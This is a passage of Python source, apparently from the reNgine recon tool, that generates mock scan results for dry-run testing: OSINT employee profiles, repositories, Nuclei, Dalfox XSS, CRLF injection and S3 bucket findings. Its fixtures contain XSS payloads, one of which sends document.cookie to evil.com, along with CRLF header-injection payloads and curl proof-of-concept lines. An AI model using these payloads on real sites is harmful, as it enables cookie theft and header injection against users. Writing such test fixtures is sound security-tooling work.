        'CEO', 'CTO', 'CFO', 'CIO', 'Software Engineer', 'System Administrator',
        'Security Analyst', 'IT Manager', 'DevOps Engineer', 'Data Scientist'
    ]
    
    employees = []
    for _ in range(count):
        first_name = random.choice(first_names)
        last_name = random.choice(last_names)
        
        employee = {
            'name': f"{first_name} {last_name}",
            'position': random.choice(positions),
            'social_links': {}
        }
        
        # Add social media profiles with some probability
        if random.random() < 0.8:  # 80% chance of LinkedIn
            employee['social_links']['linkedin'] = f"https://www.linkedin.com/in/{first_name.lower()}-{last_name.lower()}-{random.randint(100, 999)}"
        
        if random.random() < 0.5:  # 50% chance of Twitter
            employee['social_links']['twitter'] = f"https://twitter.com/{first_name.lower()}{last_name.lower()}{random.randint(1, 99)}"
        
        employees.append(employee)
    
    return employees


def generate_mock_github_repos(count=5, domain=None):
    """Generate mock GitHub repository data for OSINT.
    
    Args:
        count (int): Number of repositories to generate
        domain (str): Base domain to use for organization name
        
    Returns:
        list: List of mock GitHub repositories
    """
    repo_prefixes = [
        'api', 'web', 'app', 'backend', 'frontend', 'mobile', 'desktop',
        'core', 'utils', 'tools', 'lib', 'framework', 'sdk', 'client'
    ]
    
    repo_suffixes = [
        '', '-v2', '-service', '-library', '-app', '-tool', '-project',
        '-framework', '-lib', '-module', '-component', '-sdk'
    ]
    
    languages = [
        'JavaScript', 'Python', 'Java', 'Go', 'TypeScript', 'PHP',
        'Ruby', 'C#', 'C++', 'Swift', 'Kotlin', 'Rust'
    ]
    
    # Determine org name from domain
    if domain:
        org_name = domain.split('.')[0].lower()
    else:
        org_name = random.choice(['company', 'corp', 'tech', 'labs', 'dev'])
    
    repos = []
    for _ in range(count):
        prefix = random.choice(repo_prefixes)
        suffix = random.choice(repo_suffixes)
        repo_name = f"{prefix}{suffix}"
        
        # Randomly choose if public or private
        is_public = random.random() < 0.6  # 60% chance of public
        
        repo = {
            'name': repo_name,
            'full_name': f"{org_name}/{repo_name}",
            'url': f"https://github.com/{org_name}/{repo_name}",
            'description': f"A {prefix} {suffix.replace('-', ' ').strip()} for {org_name}",
            'is_public': is_public,
            'language': random.choice(languages),
            'stars': random.randint(0, 1000) if is_public else 0,
            'forks': random.randint(0, 200) if is_public else 0,
            'last_updated': f"2023-{random.randint(1, 12):02d}-{random.randint(1, 28):02d}T{random.randint(0, 23):02d}:{random.randint(0, 59):02d}:00Z"
        }
        
        repos.append(repo)
    
    return repos

def generate_mock_nuclei_vulnerabilities(urls, count=5):
    """Generate mock vulnerability data for dry run testing
    
    Args:
        urls (list): List of URLs to associate vulnerabilities with
        count (int): Number of vulnerabilities to generate per URL
        
    Returns:
        list: List of mock vulnerability dictionaries
    """
    from datetime import datetime
    import random
    
    vulnerabilities = []
    severity_levels = ["critical", "high", "medium", "low", "info"]
    vulnerability_types = [
        "SQL Injection", "XSS", "CSRF", "Open Redirect", 
        "Information Disclosure", "SSRF", "Command Injection",
        "Directory Traversal", "RCE", "LFI", "XXE"
    ]
    
    for url in urls:
        for _ in range(count):
            severity = random.choice(severity_levels)
            vuln_type = random.choice(vulnerability_types)
            
            vulnerability = {
                "info": {
                    "name": f"Mock {vuln_type}",
                    "author": ["reNgine"],
                    "severity": severity,
                    "description": f"This is a mock {vuln_type.lower()} vulnerability found during dry run testing",
                    "reference": [
                        "https://owasp.org/",
                        "https://portswigger.net/web-security"
                    ],
                    "tags": [vuln_type.lower().replace(" ", "-"), "mock", "dry-run"]
                },
                "host": url,
                "matched-at": f"{url}/vulnerable-path",
                "extracted-results": ["mock-data-1", "mock-data-2"],
                "timestamp": datetime.now().isoformat(),
                "matcher-name": "mock-matcher",
                "template-id": f"mock-{vuln_type.lower().replace(' ', '-')}"
            }
            
            vulnerabilities.append(vulnerability)
    
    return vulnerabilities

def generate_mock_dalfox_vulnerabilities(urls, count=3):
    """Generate mock Dalfox XSS vulnerability data for dry run testing
    
    Args:
        urls (list): List of URLs to associate vulnerabilities with
        count (int): Number of vulnerabilities to generate per URL
        
    Returns:
        list: List of mock Dalfox vulnerability dictionaries
    """
    from datetime import datetime
    import random
    
    vulnerabilities = []
    
    # XSS Payloads commonly detected by Dalfox
    xss_payloads = [
        "<script>alert(1)</script>",
        "javascript:alert(document.domain)",
        "<img src=x onerror=alert(1)>",
        "<svg onload=alert(1)>",
        "<body onload=alert(1)>",
        "'-alert(1)-'",
        "\"><script>alert(1)</script>",
        "<script>fetch('https://evil.com?cookie='+document.cookie)</script>"
    ]
    
    # Dalfox output message types
    message_types = [
        "Reflected XSS found",
        "DOM XSS found",
        "Stored XSS found",
        "Blind XSS potentially found",
        "CSP Bypass found",
        "Template injection found"
    ]
    
    # Parameters commonly vulnerable to XSS
    params = ["q", "search", "id", "user", "input", "query", "keyword", "redirect", "url", "data"]
    
    for url in urls:
        for _ in range(count):
            payload = random.choice(xss_payloads)
            param = random.choice(params)
            message_type = random.choice(message_types)
            
            # Create mock vulnerability with Dalfox expected structure
            vulnerability = {
                "param": param,
                "type": "xss",
                "payload": payload,
                "evidence": f"Found XSS in {param} parameter",
                "message": message_type,
                "message_str": f"Try this payload: {payload}",
                "severity": random.choice(["high", "medium", "critical"]),
                "url": f"{url}?{param}={payload}",
                "poc": f"curl -X GET '{url}?{param}={payload}'",
                "raw": f"GET /?{param}={payload} HTTP/1.1\nHost: {url.replace('https://', '').replace('http://', '')}\nUser-Agent: Mozilla/5.0\nAccept: */*",
                "recommendation": "Implement proper input validation and output encoding",
                "timestamp": datetime.now().isoformat()
            }
            
            vulnerabilities.append(vulnerability)
    
    return vulnerabilities

def generate_mock_crlfuzz_vulnerabilities(urls, count=3):
    """Generate mock CRLFUZZ vulnerability data for dry run testing
    
    Args:
        urls (list): List of URLs to associate vulnerabilities with
        count (int): Number of vulnerabilities to generate per URL
        
    Returns:
        list: List of mock CRLFUZZ vulnerability dictionaries
    """
    from datetime import datetime
    import random
    
    vulnerabilities = []
    
    # CRLF Injection payloads
    crlf_payloads = [
        "%0D%0ASet-Cookie: crlfinjection=crlfinjection",
        "%0d%0aContent-Length:35%0d%0aX-XSS-Protection:0%0d%0a%0d%0a23",
        r"%0D%0ASet-Cookie: csrf=fake_token",
        r"%%0d%0aLocation:%20https://evil.com",
        r"%E5%98%8D%E5%98%8ASet-Cookie:crlf=injection",
        r"%0dSet-Cookie:crlfinjection=crlfinjection",
        r"%0aSet-Cookie:crlfinjection=crlfinjection",
        r"%0d%0aSet-Cookie:%20malicious=1"
    ]
    
    # Response headers that might be affected
    affected_headers = [
        "Set-Cookie", 
        "Location", 
        "Content-Type", 
        "Content-Length", 
        "X-XSS-Protection", 
        "Content-Disposition"
    ]
    
    for url in urls:
        for _ in range(count):
            payload = random.choice(crlf_payloads)
            affected_header = random.choice(affected_headers)
            
            # Generate a mock vulnerable URL
            full_url = f"{url}?param={payload}"
            
            # Create mock vulnerability with CRLFUZZ expected structure
            vulnerability = {
                "url": full_url,
                "payload": payload,
                "impact": f"HTTP Header Injection affecting {affected_header}",
                "evidence": f"HTTP/1.1 200 OK\r\n{affected_header}: malicious_value\r\n",
                "severity": "medium",
                "description": "CRLF Injection allows attackers to inject headers into the HTTP response",
                "details": "This vulnerability occurs when user-supplied input that contains CR and LF characters is included in HTTP response headers without proper sanitization.",
                "remediation": "Validate and sanitize user input before including it in HTTP response headers. Use a whitelist approach to validate input.",
                "request": f"GET {full_url.replace(url, '')} HTTP/1.1\nHost: {url.replace('https://', '').replace('http://', '')}\nUser-Agent: Mozilla/5.0",
                "response": f"HTTP/1.1 200 OK\r\n{affected_header}: malicious_value\r\nContent-Type: text/html\r\n\r\n<html></html>",
                "timestamp": datetime.now().isoformat()
            }
            
            vulnerabilities.append(vulnerability)
    
    return vulnerabilities

def generate_mock_s3scanner_vulnerabilities(count=5):
    """Generate mock S3Scanner bucket data for dry run testing
    
    Args:
        count (int): Number of S3 buckets to generate
        
    Returns:
        list: List of mock S3Scanner bucket dictionaries
    """
    import random
    from datetime import datetime

    results = []

    # Providers for the mock data
    providers = ["AWS", "GCP", "Azure", "DigitalOcean", "Alibaba"]

    # Regions for AWS
    aws_regions = [
        "us-east-1", "us-east-2", "us-west-1", "us-west-2",
        "eu-west-1", "eu-central-1", "ap-south-1", "ap-northeast-1"
    ]

    # Company names for bucket naming
    companies = ["company", "enterprise", "corp", "org", "tech", "app", "data", "backup", "storage", "assets"]

    # Owner IDs
    owner_ids = [
        "a123b456c789d0123e456f789g0123h456i789",
        "b234c567d890e1234f567g890h1234i567j890",
        "c345d678e901f2345g678h901i2345j678k901",
        "d456e789f012g3456h789i012j3456k789l012"
    ]

    # Owner display names
    owner_names = [
        "S3Owner", 
        "AdminUser", 
        "BucketAdmin", 
        "CloudOps", 
        "DevOpsTeam", 
        "CompanyName"
    ]

    # Generate mock buckets
    for _ in range(count):
        company = random.choice(companies)
        purpose = random.choice(["backup", "data", "static", "media", "archive", "logs", "config", "assets"])
        env = random.choice(["dev", "prod", "test", "staging", "uat"])

        # Generate a realistic-looking bucket name
        bucket_name = f"{company}-{purpose}-{env}-{random.randint(1000, 9999)}"

        # For some buckets, simulate misconfiguration with public permissions
        is_misconfigured = random.random() < 0.6  # 60% chance of misconfiguration

        # Create the bucket data structure matching what S3Scanner would return
        bucket = {
            "bucket": {
                "name": bucket_name,
                "region": random.choice(aws_regions),
                "provider": random.choice(providers),
                "owner_display_name": random.choice(owner_names),
                "owner_id": random.choice(owner_ids),
                # Permissions - some set to misconfigured
                "perm_auth_users_read": random.random() < 0.3 if is_misconfigured else False,
                "perm_auth_users_write": random.random() < 0.2 if is_misconfigured else False,
                "perm_auth_users_read_acl": random.random() < 0.2 if is_misconfigured else False,
                "perm_auth_users_write_acl": random.random() < 0.1 if is_misconfigured else False,
                "perm_auth_users_full_control": random.random() < 0.1 if is_misconfigured else False,
                "perm_all_users_read": random.random() < 0.5 if is_misconfigured else False,
                "perm_all_users_write": random.random() < 0.3 if is_misconfigured else False,
                "perm_all_users_read_acl": random.random() < 0.2 if is_misconfigured else False,
                "perm_all_users_write_acl": random.random() < 0.2 if is_misconfigured else False,
                "perm_all_users_full_control": random.random() < 0.1 if is_misconfigured else False,
                # Bucket stats
                "num_objects": random.randint(5, 10000),
                "bucket_size": random.randint(1024, 1073741824),  # Size in bytes (1KB to 1GB)
                "created_at": (datetime.now().replace(
                    day=random.randint(1, 28),
                    month=random.randint(1, 12),
                    year=random.randint(2020, 2023)
                )).isoformat(),
                "url": f"https://{bucket_name}.s3.amazonaws.com/"
            },
            "timestamp": datetime.now().isoformat(),
            "scan_id": f"s3scan-{random.randint(10000, 99999)}"
        }

        results.append(bucket)

    return results